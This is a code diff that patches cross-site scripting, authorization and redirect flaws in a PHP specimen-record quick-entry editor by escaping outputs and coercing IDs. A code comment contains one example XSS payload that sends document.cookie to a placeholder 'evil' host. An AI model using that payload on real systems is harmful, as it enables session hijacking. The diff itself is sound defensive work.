@@ -4,6 +4,22 @@ include_once($SERVER_ROOT.'/content/lang/collections/editor/occurrenceeditor.'.$
 
 header("Content-Type: text/html; charset=".$CHARSET);
 
+//Emit $val as a JS literal that is safe inside a double-quoted HTML event attribute.
+//Two encodings are needed and both matter: json_encode escapes the value for the JS
+//string context, htmlspecialchars escapes json_encode's own double quotes for the
+//attribute context. Falsy stays bare `null`, matching what the callers emitted before.
+function qeJsAttrArg($val){
+	if(!$val) return 'null';
+	// JSON_INVALID_UTF8_SUBSTITUTE and ENT_SUBSTITUTE both matter: json_encode()
+	// returns false on invalid UTF-8 and htmlspecialchars() returns '' for it, so
+	// without them a legacy latin1 value (a bare 0xE9 in catalogNumber, say) made the
+	// argument vanish entirely -- navigateToRecordNew(0, 0, 1, 5, 3, 2, , 4, 2), a
+	// SyntaxError that kills every nav button on the page rather than one field.
+	$json = json_encode((string)$val, JSON_INVALID_UTF8_SUBSTITUTE);
+	if($json === false) return 'null';
+	return htmlspecialchars($json, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
+}
+
 $occId = array_key_exists('occid',$_REQUEST)?filter_var($_REQUEST['occid'], FILTER_SANITIZE_NUMBER_INT):'';
 $collId = array_key_exists('collid',$_REQUEST)?filter_var($_REQUEST['collid'], FILTER_SANITIZE_NUMBER_INT):false;
 $tabTarget = array_key_exists('tabtarget',$_REQUEST)?$_REQUEST['tabtarget']:0;
@@ -123,6 +139,34 @@ if(!is_numeric($tabTarget)) $tabTarget = 0;
 if(!is_numeric($goToMode)) $goToMode = 0;
 if(!is_numeric($occIndex)) $occIndex = false;
 if(!is_numeric($crowdSourceMode)) $crowdSourceMode = 0;
+// Both are media IDs / offsets, so both must be numeric. They were missing from
+// this block while every other request value was covered, and they reach output
+// sinks in three different contexts. Grep rather than line numbers, which rot:
+//   `var activeImgIndex =`                 -- bare literal in an inline <script>
+//   `name="imgindex"` / `name="imgid"`     -- HTML attributes
+//   `navigateToRecordNew(`                 -- inline JS argument lists
+//   and $imgId = $currentImgId is passed on to the OCR processor include
+// so e.g. ?imgid=0;fetch('https://evil/?c='+document.cookie)// executed attacker
+// JS in an authenticated editor's session.
+//
+// Coercing here rather than escaping at each sink: it is one guard instead of
+// six, it cannot be forgotten when a seventh sink is added, and a numeric value
+// is safe in every one of those contexts (inline JS, attribute, and JS argument
+// list) whereas htmlspecialchars alone is not safe inside <script>.
+//
+// 0 rather than '' when absent, because the `var activeImgIndex =` line emits the
+// value as a bare JS literal -- '' renders `var activeImgIndex = ;`, a SyntaxError
+// that kills the whole inline script block and silently breaks the OCR and
+// record-navigation buttons. No code branches on $currentImgId being falsy, and
+// mediaID is never 0, so 0 behaves as "no image" exactly as null did.
+//
+// Cast to int rather than leaving the numeric string as-is: is_numeric() accepts
+// forms that are legal PHP numbers but not the JS integer literal these sinks
+// assume. '007' would emit `var activeImgIndex = 007;` -- a legacy octal literal,
+// which is a SyntaxError under strict mode -- and '1e3' would silently become
+// 1000. Both are media IDs, so an int is the only shape that makes sense.
+$currentImgId = is_numeric($currentImgId) ? (int) $currentImgId : 0;
+$currentImgIndex = is_numeric($currentImgIndex) ? (int) $currentImgIndex : 0;
 $action = htmlspecialchars(strip_tags($action), ENT_QUOTES, 'UTF-8');
 
 $displayQuery = 0;
@@ -234,8 +278,11 @@ if($SYMB_UID){
 	include_once '../../collections/editor/editProcessor.php';
 	if($action == 'saveOccurEdits'){
 		$statusStr = $occManager->editOccurrence($_POST,$isEditor);
-		$updateSuccess = $occManager->updateLastEdited($batchId, $currentImgId);
-	} 
+		//Only write the batch bookmark for users editOccurrence would actually accept an edit from,
+		//and scope it to $collId (reconciled to $collMap['collid'] above) so an editor of one
+		//collection cannot touch another collection's batch row by posting an arbitrary batchid.
+		if($isEditor) $updateSuccess = $occManager->updateLastEdited($batchId, $currentImgId, $collId);
+	}
 
 	if($isEditor){
 		//Available to full editors and taxon editors
@@ -497,20 +544,20 @@ if($SYMB_UID){
 
 	if($imgNum !== false){
 		$navStr = '<b>';
-		if($currentImgIndex > 0) $navStr .= '<a href="#" onclick="return navigateToRecordNew('.($crowdSourceMode).', '.($goToMode).', '.($collId).', '.$batchIdForJs.', '.($firstImgId?$firstImgId:'null').', '.($firstIndex).', '.($firstBarcode?"'".$firstBarcode."'":'null').', '.($firstOccId?$firstOccId:'null').', '.($firstIndex).')" title="'.(isset($LANG['FIRST_REC'])?$LANG['FIRST_REC']:'First Record').'">';
+		if($currentImgIndex > 0) $navStr .= '<a href="#" onclick="return navigateToRecordNew('.($crowdSourceMode).', '.($goToMode).', '.($collId).', '.$batchIdForJs.', '.($firstImgId?$firstImgId:'null').', '.($firstIndex).', '.qeJsAttrArg($firstBarcode).', '.($firstOccId?$firstOccId:'null').', '.($firstIndex).')" title="'.(isset($LANG['FIRST_REC'])?$LANG['FIRST_REC']:'First Record').'">';
 		$navStr .= '|&lt;';
 		if($currentImgIndex > 0) $navStr .= '</a>';
 		$navStr .= '&nbsp;&nbsp;&nbsp;&nbsp;';
-		if($currentImgIndex > 0) $navStr .= '<a href="#" onclick="return navigateToRecordNew('.($crowdSourceMode).', '.($goToMode).', '.($collId).', '.$batchIdForJs.', '.($prevImgid).', '.($currentImgIndex-1).', '.($prevBarcode?"'".$prevBarcode."'":'null').', '.($prevOccid).', '.($currentImgIndex-1).')" title="'.(isset($LANG['PREV_REC']) ? $LANG['PREV_REC'] : 'Previous Record').'">';
+		if($currentImgIndex > 0) $navStr .= '<a href="#" onclick="return navigateToRecordNew('.($crowdSourceMode).', '.($goToMode).', '.($collId).', '.$batchIdForJs.', '.($prevImgid).', '.($currentImgIndex-1).', '.qeJsAttrArg($prevBarcode).', '.($prevOccid).', '.($currentImgIndex-1).')" title="'.(isset($LANG['PREV_REC']) ? $LANG['PREV_REC'] : 'Previous Record').'">';
 		$navStr .= '&lt;&lt;';
 		if($currentImgIndex > 0) $navStr .= '</a>';
 		$recIndex = ($currentImgIndex<$imgNum?($currentImgIndex + 1):'*');
 		$navStr .= '&nbsp;&nbsp;| '.($recIndex).' of '.($imgNum).' |&nbsp;&nbsp;';
-		if ($currentImgIndex < $imgNum-1) $navStr .= '<a href="#" onclick="return navigateToRecordNew('.($crowdSourceMode).', '.($goToMode).', '.($collId).', '.$batchIdForJs.', '.($nextImgid).', '.($currentImgIndex+1).', '.($nextBarcode?"'".$nextBarcode."'":'null').', '.($nextOccid).', '.($currentImgIndex+1).')" title="'.(isset($LANG['NEXT_REC']) ? $LANG['NEXT_REC']:'Next Record').'">';
+		if ($currentImgIndex < $imgNum-1) $navStr .= '<a href="#" onclick="return navigateToRecordNew('.($crowdSourceMode).', '.($goToMode).', '.($collId).', '.$batchIdForJs.', '.($nextImgid).', '.($currentImgIndex+1).', '.qeJsAttrArg($nextBarcode).', '.($nextOccid).', '.($currentImgIndex+1).')" title="'.(isset($LANG['NEXT_REC']) ? $LANG['NEXT_REC']:'Next Record').'">';
 		$navStr .= '&gt;&gt;';
 		if($currentImgIndex < $imgNum-1) $navStr .= '</a>';
 		$navStr .= '&nbsp;&nbsp;&nbsp;&nbsp;';
-		if($currentImgIndex < $imgNum-1) $navStr .= '<a href="#" onclick="return navigateToRecordNew('.($crowdSourceMode).', '.($goToMode).', '.($collId).', '.$batchIdForJs.', '.($lastImgId?$lastImgId:'null').', '.($lastIndex).', '.($lastBarcode?"'".$lastBarcode."'":'null').', '.($lastOccId?$lastOccId:'null').', '.($lastIndex).')" title="'.(isset($LANG['LAST_REC'])?$LANG['LAST_REC']:'Last Record').'">';
+		if($currentImgIndex < $imgNum-1) $navStr .= '<a href="#" onclick="return navigateToRecordNew('.($crowdSourceMode).', '.($goToMode).', '.($collId).', '.$batchIdForJs.', '.($lastImgId?$lastImgId:'null').', '.($lastIndex).', '.qeJsAttrArg($lastBarcode).', '.($lastOccId?$lastOccId:'null').', '.($lastIndex).')" title="'.(isset($LANG['LAST_REC'])?$LANG['LAST_REC']:'Last Record').'">';
 		$navStr .= '&gt;|';
 		if($currentImgIndex < $imgNum-1) $navStr .= '</a> ';
 		$navStr .= '</b>';
@@ -560,6 +607,11 @@ else{
 	$q = isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '';
 	$ref = '../collections/quickentry/occurrencequickentry.php' . ($q ? ('?' . $q) : '');
 	header('Location: ../../profile/index.php?refurl=' . rawurlencode($ref));
+	// header() only queues a status line; without exit PHP carries on and renders
+	// the entire page body below, which is sent along with the 302 and is
+	// readable by any client that does not follow redirects -- so the editor UI
+	// was being served to unauthenticated callers.
+	exit;
 }
 ?>
 <html>
@@ -624,8 +676,8 @@ else{
 		<script src="../../js/jquery.imagetool-1.7.js?ver=140310" type="text/javascript"></script>
 		<script src="../../js/symb/collections.editor.query.js?ver=6" type="text/javascript"></script>
 		<script>
-			var record_created_utc = '<?php echo $occArr['modified']; ?>';
-			var last_modified_utc = '<?php echo $occArr['dateLastModified']; ?>';
+			var record_created_utc = <?php echo json_encode((string)($occArr['modified'] ?? ''), JSON_HEX_TAG|JSON_HEX_AMP|JSON_HEX_APOS|JSON_HEX_QUOT); ?>;
+			var last_modified_utc = <?php echo json_encode((string)($occArr['dateLastModified'] ?? ''), JSON_HEX_TAG|JSON_HEX_AMP|JSON_HEX_APOS|JSON_HEX_QUOT); ?>;
 			var userTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
 			// Function to convert UTC time to user's timezone
@@ -650,13 +702,13 @@ else{
 				lastModifiedElement.textContent = 'Last Modified: ' + convertTimeToUserTimezone(last_modified_utc);
 			});
 
-			var barcodeHashTable = <?php echo json_encode($barcodeHashTable); ?>;
-			var occIdHashTable = <?php echo json_encode($occIdHashTable); ?>;
+			var barcodeHashTable = <?php echo json_encode($barcodeHashTable, JSON_HEX_TAG|JSON_HEX_AMP|JSON_HEX_APOS|JSON_HEX_QUOT); ?>;
+			var occIdHashTable = <?php echo json_encode($occIdHashTable, JSON_HEX_TAG|JSON_HEX_AMP|JSON_HEX_APOS|JSON_HEX_QUOT); ?>;
 			function jumpToPage() {
 				// Get the page number from the input field
 				var pageNumberInput = document.getElementById("pageNumber");
     			var pageNumber = parseInt(pageNumberInput.value);
-				var imgids = <?php echo json_encode($imgIDs); ?>;
+				var imgids = <?php echo json_encode($imgIDs, JSON_HEX_TAG|JSON_HEX_AMP|JSON_HEX_APOS|JSON_HEX_QUOT); ?>;
 
 				// Check if the page number is a valid key in the hash tables
 				if (pageNumber in barcodeHashTable && pageNumber in occIdHashTable) {
@@ -666,8 +718,13 @@ else{
 					var imgId = imgids[pageNumber-1] 
 					var crowdSourceMode = <?php echo $crowdSourceMode; ?>;
 					var gotomode = <?php echo $goToMode; ?>;
-					var collId = <?php echo $collId; ?>;
-					var batchId = <?php echo json_encode($batchId); ?>;
+					// $collId is set to false when non-numeric, and `var collId = ;` is a
+					// SyntaxError that kills this whole inline script -- the same failure
+					// the sanitation comment above describes for activeImgIndex. The
+					// declaration at the top of the page already falls back to 0; do the
+					// same here rather than emitting nothing.
+					var collId = <?php echo is_numeric($collId) ? (int)$collId : 0; ?>;
+					var batchId = <?php echo json_encode($batchId, JSON_HEX_TAG|JSON_HEX_AMP|JSON_HEX_APOS|JSON_HEX_QUOT); ?>;
 					var occIndex = pageNumber - 1; 
 
 					// Call the navigateToRecordNew function with the calculated parameters
@@ -767,7 +824,7 @@ else{
 					?>
 					<div id="statusdiv" style="margin:5px 0px 5px 15px;">
 						<b><?php echo (isset($LANG['ACTION_STATUS'])?$LANG['ACTION_STATUS']:'Action Status'); ?>: </b>
-						<span style="color:<?php echo (stripos($statusStr,'ERROR')!==false?'red':'green'); ?>;"><?php echo $statusStr; ?></span>
+						<span style="color:<?php echo (stripos($statusStr,'ERROR')!==false?'red':'green'); ?>;"><?php echo htmlspecialchars((string)$statusStr, ENT_QUOTES, 'UTF-8'); ?></span>
 						<?php
 						if($action == 'Delete Occurrence'){
 							?>
@@ -788,8 +845,8 @@ else{
 				<section>
 					<div class="btn" name="jumpform">
 						<form method="post" style="margin: 5px;">
-							<button type="submit" name="toggle-button" value="<?php echo isset($_POST['toggle-button']) && $_POST['toggle-button'] === 'Minimal' ? 'Detailed' : 'Minimal'; ?>">
-								<?php echo isset($_POST['toggle-button']) ? $_POST['toggle-button'] : 'Detailed'; ?>
+							<button type="submit" name="toggle-button" value="<?php echo htmlspecialchars((string)(isset($_POST['toggle-button']) && $_POST['toggle-button'] === 'Minimal' ? 'Detailed' : 'Minimal'), ENT_QUOTES, 'UTF-8'); ?>">
+								<?php echo htmlspecialchars((string)(isset($_POST['toggle-button']) ? $_POST['toggle-button'] : 'Detailed'), ENT_QUOTES, 'UTF-8'); ?>
 							</button>
 							<button type="button" onclick="jumpToPage()">Jump to:</button>
 							<input type="number" id="pageNumber" size="3" />
@@ -823,7 +880,7 @@ else{
 							<div class="field-block">
 								<span class="field-label"><?php echo (isset($LANG['BARCODE']) ? $LANG['BARCODE'] : 'Barcode'); ?></span>
 								<span class="field-elem">
-									<input type="text" size = '50' id="barcode" name="barcode" value="<?php echo($barcode) ?>" onchange="fieldChanged('barcode');" <?php if($isEditor > 2) echo 'disabled'; ?> autocomplete="off" />
+									<input type="text" size = '50' id="barcode" name="barcode" value="<?php echo htmlspecialchars((string)$barcode, ENT_QUOTES, 'UTF-8'); ?>" onchange="fieldChanged('barcode');" <?php if($isEditor > 2) echo 'disabled'; ?> autocomplete="off" />
 								</span>
 							</div>
 							<?php if(!isset($_POST['toggle-button']) || (isset($_POST['toggle-button']) && $_POST['toggle-button'] != 'Minimal')): ?>
@@ -870,13 +927,13 @@ else{
 								<div class="field-block">
 									<span class="field-label"><?php echo (defined('IDENTIFIEDBYLABEL')?IDENTIFIEDBYLABEL:'Identified By'); ?></span>
 									<span class="field-elem">
-										<input size = '50' type="text"  maxlength="255" name="identifiedby" id="ffidentifiedby" value="<?php echo array_key_exists('identifiedby',$occArr)?$occArr['identifiedby']:''; ?>" onchange="fieldChanged('identifiedby');" />
+										<input size = '50' type="text"  maxlength="255" name="identifiedby" id="ffidentifiedby" value="<?php echo htmlspecialchars((string)(array_key_exists('identifiedby',$occArr)?$occArr['identifiedby']:''), ENT_QUOTES, 'UTF-8'); ?>" onchange="fieldChanged('identifiedby');" />
 									</span>
 								</div>
 								<div class="field-block">
 									<span class="field-label"><?php echo (defined('DATEIDENTIFIEDLABEL')?DATEIDENTIFIEDLABEL:'Date Identified'); ?></span>
 									<span class="field-elem">
-										<input size = '50' type="text" name="dateidentified" maxlength="45" value="<?php echo array_key_exists('dateidentified',$occArr)?$occArr['dateidentified']:''; ?>" onchange="fieldChanged('dateidentified');" />
+										<input size = '50' type="text" name="dateidentified" maxlength="45" value="<?php echo htmlspecialchars((string)(array_key_exists('dateidentified',$occArr)?$occArr['dateidentified']:''), ENT_QUOTES, 'UTF-8'); ?>" onchange="fieldChanged('dateidentified');" />
 									</span>
 								</div>
 								<!-- There is a tab below is for determiation -->
@@ -896,32 +953,32 @@ else{
 							<div class="field-block">
 								<span class="field-label"><?php echo (defined('RECORDEDBYLABEL')?RECORDEDBYLABEL:'Collectors'); ?></span>
 								<span class="field-elem">
-									<input size = '50' type="text" name="recordedby" id="ffrecordedby" maxlength="255" value="<?php echo array_key_exists('recordedby',$occArr)?$occArr['recordedby']:''; ?>" onchange="fieldChanged('recordedby');" />
+									<input size = '50' type="text" name="recordedby" id="ffrecordedby" maxlength="255" value="<?php echo htmlspecialchars((string)(array_key_exists('recordedby',$occArr)?$occArr['recordedby']:''), ENT_QUOTES, 'UTF-8'); ?>" onchange="fieldChanged('recordedby');" />
 								</span>
 							</div>
 							<!-- I put associated collectors here -->
 							<div class="field-block">
 								<span class="field-label"><?php echo (defined('ASSOCIATEDCOLLECTORSLABEL')?ASSOCIATEDCOLLECTORSLABEL:'Et al.'); ?></span>
 								<span class="field-elem">
-									<input size = '50' type="text" name="associatedcollectors" maxlength="255" value="<?php echo array_key_exists('associatedcollectors',$occArr)?$occArr['associatedcollectors']:''; ?>" onchange="fieldChanged('associatedcollectors');" />
+									<input size = '50' type="text" name="associatedcollectors" maxlength="255" value="<?php echo htmlspecialchars((string)(array_key_exists('associatedcollectors',$occArr)?$occArr['associatedcollectors']:''), ENT_QUOTES, 'UTF-8'); ?>" onchange="fieldChanged('associatedcollectors');" />
 								</span>
 							</div>
 							<div class="field-block">
 								<span class="field-label"><?php echo (defined('RECORDNUMBERLABEL')?RECORDNUMBERLABEL:'Collector Number'); ?></span>
 								<span class="field-elem">
-									<input size = '50' type="text" name="recordnumber" maxlength="45" value="<?php echo array_key_exists('recordnumber',$occArr)?$occArr['recordnumber']:''; ?>" onchange="recordNumberChanged(this);" />
+									<input size = '50' type="text" name="recordnumber" maxlength="45" value="<?php echo htmlspecialchars((string)(array_key_exists('recordnumber',$occArr)?$occArr['recordnumber']:''), ENT_QUOTES, 'UTF-8'); ?>" onchange="recordNumberChanged(this);" />
 								</span>
 							</div> 
 							<div class="field-block">
 								<span class="field-label"><?php echo (defined('EVENTDATELABEL')?EVENTDATELABEL:'Date Collected'); ?></span>
 								<span class="field-elem">
-									<input size = '50' type="text" name="eventdate" id="ffeventdate" value="<?php echo array_key_exists('eventdate',$occArr)?$occArr['eventdate']:''; ?>" onchange="eventDateChanged(this);" />
+									<input size = '50' type="text" name="eventdate" id="ffeventdate" value="<?php echo htmlspecialchars((string)(array_key_exists('eventdate',$occArr)?$occArr['eventdate']:''), ENT_QUOTES, 'UTF-8'); ?>" onchange="eventDateChanged(this);" />
 								</span>
 							</div>
 							<div class="field-block">
 								<span class="field-label"><?php echo (defined('VERBATIMEVENTDATELABEL')?VERBATIMEVENTDATELABEL:'Verbatim Date'); ?></span>
 								<span class="field-elem">
-									<input size = '50' type="text" name="verbatimeventdate" maxlength="255" value="<?php echo array_key_exists('verbatimeventdate',$occArr)?$occArr['verbatimeventdate']:''; ?>" onchange="verbatimEventDateChanged(this)" />
+									<input size = '50' type="text" name="verbatimeventdate" maxlength="255" value="<?php echo htmlspecialchars((string)(array_key_exists('verbatimeventdate',$occArr)?$occArr['verbatimeventdate']:''), ENT_QUOTES, 'UTF-8'); ?>" onchange="verbatimEventDateChanged(this)" />
 								</span>
 							</div>
 							<?php if(!isset($_POST['toggle-button']) || (isset($_POST['toggle-button']) && $_POST['toggle-button'] != 'Minimal')): ?>
@@ -954,13 +1011,13 @@ else{
 								<div class="field-block">
 									<span class="field-label"><?php echo (defined('LOCALITYLABEL')?LOCALITYLABEL:'Verbatim Locality'); ?></span>
 									<span class="field-elem">
-										<input id="fflocality" type="text" size = '50'  onchange="fieldChanged('locality');" name="locality" value="<?php echo array_key_exists('locality',$occArr)?$occArr['locality']:''; ?>" />
+										<input id="fflocality" type="text" size = '50'  onchange="fieldChanged('locality');" name="locality" value="<?php echo htmlspecialchars((string)(array_key_exists('locality',$occArr)?$occArr['locality']:''), ENT_QUOTES, 'UTF-8'); ?>" />
 									</span>
 								</div>
 								<div class="field-block">
 									<span class="field-label"><?php echo (defined('HABITATLABEL')?HABITATLABEL:'Habitat'); ?></span>
 									<span class="field-elem">
-										<input size = '50' type="text" name="habitat" value="<?php echo array_key_exists('habitat',$occArr)?$occArr['habitat']:''; ?>" onchange="fieldChanged('habitat');" />
+										<input size = '50' type="text" name="habitat" value="<?php echo htmlspecialchars((string)(array_key_exists('habitat',$occArr)?$occArr['habitat']:''), ENT_QUOTES, 'UTF-8'); ?>" onchange="fieldChanged('habitat');" />
 									</span>
 								</div>
 								<div class="field-block">
@@ -972,13 +1029,13 @@ else{
 								<div class="field-block">
 									<span class="field-label"><?php echo (defined('VERBATIMATTRIBUTESLABEL')?VERBATIMATTRIBUTESLABEL:'Description'); ?></span>
 									<span class="field-elem">
-										<input size = '50' type="text" name="verbatimattributes" value="<?php echo array_key_exists('verbatimattributes',$occArr)?$occArr['verbatimattributes']:''; ?>" onchange="fieldChanged('verbatimattributes');" />
+										<input size = '50' type="text" name="verbatimattributes" value="<?php echo htmlspecialchars((string)(array_key_exists('verbatimattributes',$occArr)?$occArr['verbatimattributes']:''), ENT_QUOTES, 'UTF-8'); ?>" onchange="fieldChanged('verbatimattributes');" />
 									</span>
 								</div>
 								<div class="field-block">
 									<span class="field-label"><?php echo (defined('OCCURRENCEREMARKSLABEL')?OCCURRENCEREMARKSLABEL:'Remarks'); ?></span>
 									<span class="field-elem">
-										<input size = '50' type="text" name="occurrenceremarks" value="<?php echo array_key_exists('occurrenceremarks',$occArr)?$occArr['occurrenceremarks']:''; ?>" onchange="fieldChanged('occurrenceremarks');" title="<?php echo $LANG['OCC_REMARKS']; ?>" />
+										<input size = '50' type="text" name="occurrenceremarks" value="<?php echo htmlspecialchars((string)(array_key_exists('occurrenceremarks',$occArr)?$occArr['occurrenceremarks']:''), ENT_QUOTES, 'UTF-8'); ?>" onchange="fieldChanged('occurrenceremarks');" title="<?php echo htmlspecialchars((string)($LANG['OCC_REMARKS'] ?? ''), ENT_QUOTES, 'UTF-8'); ?>" />
 									</span>
 								</div>
 							<?php endif; ?>
@@ -986,13 +1043,13 @@ else{
 							<div class="field-block">
 								<span class="field-label"><?php echo (defined('LABELPROJECTLABEL')?LABELPROJECTLABEL:'Project'); ?></span>
 								<span class="field-elem">
-									<input size = '50' type="text" name="labelproject" maxlength="45" value="<?php echo array_key_exists('labelproject',$occArr)?$occArr['labelproject']:''; ?>" onchange="fieldChanged('labelproject');" />
+									<input size = '50' type="text" name="labelproject" maxlength="45" value="<?php echo htmlspecialchars((string)(array_key_exists('labelproject',$occArr)?$occArr['labelproject']:''), ENT_QUOTES, 'UTF-8'); ?>" onchange="fieldChanged('labelproject');" />
 								</span>
 							</div>
 							<div class="field-block">
 								<span class="field-label"><?php echo (isset($LANG['RECCORECTED']) ? $LANG['RECCORECTED'] : 'Record Created'); ?>:</span>
 								<span class="field-elem">
-									<input readonly size = '50' type='hidden' type='text' name='modified' id='modifiedInput' value="<?php echo $occArr['modified']; ?>" />
+									<input readonly size = '50' type='hidden' type='text' name='modified' id='modifiedInput' value="<?php echo htmlspecialchars((string)($occArr['modified']), ENT_QUOTES, 'UTF-8'); ?>" />
 									<span id="displayModified"></span>
 								</span>
 							</div>
@@ -1012,7 +1069,7 @@ else{
 								<div class="field-block">
 									<span class="field-label"><?php echo (defined('VERBATIMELEVATIONLABEL')?VERBATIMELEVATIONLABEL:'Verb. Elev.'); ?></span>
 									<span class="field-elem">
-										<input size = '50' type="text" name="verbatimelevation" maxlength="255" value="<?php echo array_key_exists('verbatimelevation',$occArr)?$occArr['verbatimelevation']:''; ?>" onchange="verbatimElevationChanged(this.form);" />
+										<input size = '50' type="text" name="verbatimelevation" maxlength="255" value="<?php echo htmlspecialchars((string)(array_key_exists('verbatimelevation',$occArr)?$occArr['verbatimelevation']:''), ENT_QUOTES, 'UTF-8'); ?>" onchange="verbatimElevationChanged(this.form);" />
 									</span>
 								</div>
 								<div class="field-block">
@@ -1038,7 +1095,7 @@ else{
 											$latValue = $occArr["decimallatitude"];
 										}
 										?>
-										<input size = '50' type="text" name="decimallatitude" maxlength="15" value="<?php echo $latValue; ?>" onchange="decimalLatitudeChanged(this.form)" />
+										<input size = '50' type="text" name="decimallatitude" maxlength="15" value="<?php echo htmlspecialchars((string)($latValue), ENT_QUOTES, 'UTF-8'); ?>" onchange="decimalLatitudeChanged(this.form)" />
 									</span>
 								</div>
 								<div class="field-block">
@@ -1050,7 +1107,7 @@ else{
 											$longValue = $occArr["decimallongitude"];
 										}
 										?>
-										<input size = '50' type="text" name="decimallongitude" maxlength="15" value="<?php echo $longValue; ?>" onchange="decimalLongitudeChanged(this.form);" />
+										<input size = '50' type="text" name="decimallongitude" maxlength="15" value="<?php echo htmlspecialchars((string)($longValue), ENT_QUOTES, 'UTF-8'); ?>" onchange="decimalLongitudeChanged(this.form);" />
 									</span>
 								</div>
 								<div class="field-block">
@@ -1062,14 +1119,14 @@ else{
 								<div class="field-block">
 									<span class="field-label"><?php echo (defined('COORDINATEUNCERTAINITYINMETERSLABEL')?COORDINATEUNCERTAINITYINMETERSLABEL:'Uncertainty'); ?></span>
 									<span class="field-elem">
-										<input size = '50' type="text" name="coordinateuncertaintyinmeters" maxlength="10" value="<?php echo array_key_exists('coordinateuncertaintyinmeters',$occArr)?$occArr['coordinateuncertaintyinmeters']:''; ?>" onchange="coordinateUncertaintyInMetersChanged(this.form);" title="<?php echo (isset($LANG['UNCERTAINTY_METERS'])?$LANG['UNCERTAINTY_METERS']:'Uncertainty in Meters'); ?>" />
+										<input size = '50' type="text" name="coordinateuncertaintyinmeters" maxlength="10" value="<?php echo htmlspecialchars((string)(array_key_exists('coordinateuncertaintyinmeters',$occArr)?$occArr['coordinateuncertaintyinmeters']:''), ENT_QUOTES, 'UTF-8'); ?>" onchange="coordinateUncertaintyInMetersChanged(this.form);" title="<?php echo (isset($LANG['UNCERTAINTY_METERS'])?$LANG['UNCERTAINTY_METERS']:'Uncertainty in Meters'); ?>" />
 									</span>
 								</div>
 							<?php endif; ?>
 						</div>
 						<section>
 							<div class="info function-bar">
-								<div style="float:left;" title="<?php echo $LANG['PRIMARY_KEY']; ?>">
+								<div style="float:left;" title="<?php echo htmlspecialchars((string)($LANG['PRIMARY_KEY'] ?? ''), ENT_QUOTES, 'UTF-8'); ?>">
 									<?php if($occId) echo 'Key: '.$occManager->getOccId(); ?>
 								</div>
 							</div>
@@ -1081,7 +1138,7 @@ else{
 							</div>
 							<div class="info">
 								<span id="lastModified">
-									Last Modified: <?php echo $occArr["dateLastModified"]; ?>
+									Last Modified: <?php echo htmlspecialchars((string)($occArr["dateLastModified"] ?? ''), ENT_QUOTES, 'UTF-8'); ?>
 								</span>
 							</div>
 						</section> 
@@ -1089,14 +1146,14 @@ else{
 							<tr>
 								<td>
 									<div id="bottomSubmitDiv">
-									<input type="hidden" name="csmode" value="<?php echo $crowdSourceMode; ?>">
+									<input type="hidden" name="csmode" value="<?php echo htmlspecialchars((string)($crowdSourceMode), ENT_QUOTES, 'UTF-8'); ?>">
 									<input type="hidden" name="collid" value="<?php echo htmlspecialchars($collId, ENT_QUOTES, 'UTF-8'); ?>">
-									<input type="hidden" name="batchid" value="<?php echo $batchId !== null ? (int)$batchId : ''; ?>">
-									<input type="hidden" name="imgid" value="<?php echo $imgId; ?>">
-									<input type="hidden" name="imgindex" value="<?php echo $currentImgIndex; ?>">
-									<input type="hidden" name="occid" value="<?php echo $occId; ?>">
-									<input type="hidden" name="occindex" value="<?php echo $occIndex; ?>">
-									<input type="hidden" name="institutioncode" value="<?php echo array_key_exists('institutioncode',$occArr)?$occArr['institutioncode']:''; ?>">
+									<input type="hidden" name="batchid" value="<?php echo htmlspecialchars((string)($batchId !== null ? (int)$batchId : ''), ENT_QUOTES, 'UTF-8'); ?>">
+									<input type="hidden" name="imgid" value="<?php echo htmlspecialchars((string)($imgId), ENT_QUOTES, 'UTF-8'); ?>">
+									<input type="hidden" name="imgindex" value="<?php echo htmlspecialchars((string)($currentImgIndex), ENT_QUOTES, 'UTF-8'); ?>">
+									<input type="hidden" name="occid" value="<?php echo htmlspecialchars((string)($occId), ENT_QUOTES, 'UTF-8'); ?>">
+									<input type="hidden" name="occindex" value="<?php echo htmlspecialchars((string)($occIndex), ENT_QUOTES, 'UTF-8'); ?>">
+									<input type="hidden" name="institutioncode" value="<?php echo htmlspecialchars((string)(array_key_exists('institutioncode',$occArr)?$occArr['institutioncode']:''), ENT_QUOTES, 'UTF-8'); ?>">
 										<?php
 										if($occId){
 											?>
@@ -1106,19 +1163,19 @@ else{
 													<button 
 														type="submit" 
 														value="Previous" 
-														onclick="navigateToRecordNew(<?php echo $crowdSourceMode . ', ' . $goToMode . ', ' . $collId . ', ' . $batchIdForJs . ', ' . $prevImgid . ', ' . ($currentImgIndex-1) . ', ' . ($prevBarcode ? "'".$prevBarcode."'" : 'null') . ', ' . $prevOccid . ', ' . ($currentImgIndex-1); ?>)">
+														onclick="navigateToRecordNew(<?php echo $crowdSourceMode . ', ' . $goToMode . ', ' . $collId . ', ' . $batchIdForJs . ', ' . $prevImgid . ', ' . ($currentImgIndex-1) . ', ' . qeJsAttrArg($prevBarcode) . ', ' . $prevOccid . ', ' . ($currentImgIndex-1); ?>)">
 														Previous
 													</button>
 													<a href="../misc/collprofiles.php?collid=<?php echo $collId; ?>&emode=1" >
-														<button type="button" value="Done" onclick="navigateToURL(<?php echo $collId; ?>)">Done</button>
+														<button type="button" value="Done">Done</button>
 													</a>
 													<button 
 														type="submit" 
 														value="Next" 
-														onclick="navigateToRecordNew(<?php echo $crowdSourceMode . ', ' . $goToMode . ', ' . $collId . ', ' . $batchIdForJs . ', ' . $nextImgid . ', ' . ($currentImgIndex+1) . ', ' . ($nextBarcode ? "'".$nextBarcode."'" : 'null') . ', ' . $nextOccid . ', ' . ($currentImgIndex+1); ?>)">
+														onclick="navigateToRecordNew(<?php echo $crowdSourceMode . ', ' . $goToMode . ', ' . $collId . ', ' . $batchIdForJs . ', ' . $nextImgid . ', ' . ($currentImgIndex+1) . ', ' . qeJsAttrArg($nextBarcode) . ', ' . $nextOccid . ', ' . ($currentImgIndex+1); ?>)">
 														Next
 													</button>
-													<input type="hidden" name="occindex" value="<?php echo is_numeric($occIndex)?$occIndex:''; ?>" />
+													<input type="hidden" name="occindex" value="<?php echo htmlspecialchars((string)(is_numeric($occIndex)?$occIndex:''), ENT_QUOTES, 'UTF-8'); ?>" />
 													<input type="hidden" name="editedfields" value="" />
 												</div>
 											</div>
@@ -1127,9 +1184,9 @@ else{
 										else{
 											?>
 											<div id="addButtonDiv">
-												<input name="recordenteredby" type="hidden" value="<?php echo $PARAMS_ARR['un']; ?>" />
